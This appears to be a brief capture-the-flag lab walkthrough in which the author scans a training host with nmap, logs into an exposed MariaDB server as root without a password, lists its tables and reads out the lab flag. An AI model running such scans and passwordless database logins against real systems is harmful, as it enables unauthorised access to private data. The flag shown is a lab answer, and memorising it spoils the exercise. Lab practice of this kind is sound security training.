target IP :: 10.129.183.175
let enumarate with nmap 
		sudo nmap -sCV -T5 10.129.183.175 -oN sql.txt
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 15:00 EDT
		Stats: 0:02:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
		Service scan Timing: About 100.00% done; ETC: 15:03 (0:00:00 remaining)
		Stats: 0:02:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
		NSE Timing: About 97.93% done; ETC: 15:03 (0:00:00 remaining)
		Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
		NSE Timing: About 97.93% done; ETC: 15:03 (0:00:00 remaining)
		Nmap scan report for 10.129.183.175
		Host is up (0.30s latency).
		Not shown: 999 closed tcp ports (reset)
		PORT     STATE SERVICE VERSION
		3306/tcp open  mysql?
		| mysql-info: 
		|   Protocol: 10
		|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
		|   Thread ID: 64
		|   Capabilities flags: 63486
		|   Some Capabilities: ODBCClient, SupportsCompression, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, SupportsTransactions, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolNew, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
		|   Status: Autocommit
		|   Salt: 4Pv"Do$`9=efP=}$4x"=
		|_  Auth Plugin Name: mysql_native_password
		|_ssl-cert: ERROR: Script execution failed (use -d to debug)
		|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
		|_sslv2: ERROR: Script execution failed (use -d to debug)
		|_tls-alpn: ERROR: Script execution failed (use -d to debug)
		|_ssl-date: ERROR: Script execution failed (use -d to debug)

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 198.85 seconds

here we can see there is only oen port is open, which is SQL

let run SQL command to get flag

		mysql -h 10.129.183.175 -u root           

			we can login without password 

		let find what we have in the database
				MariaDB [(none)]> show databases;
				+--------------------+
				| Database           |
				+--------------------+
				| htb                |
				| information_schema |
				| mysql              |
				| performance_schema |
				+--------------------+

 		list of databse
 		use HTB

 		MariaDB [htb]> show tables;
			+---------------+
			| Tables_in_htb |
			+---------------+
			| config        |
			| users         |
			+---------------+

		MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+



flag :: 7b4bec00d1a39e3dd4e021ec3d915da8
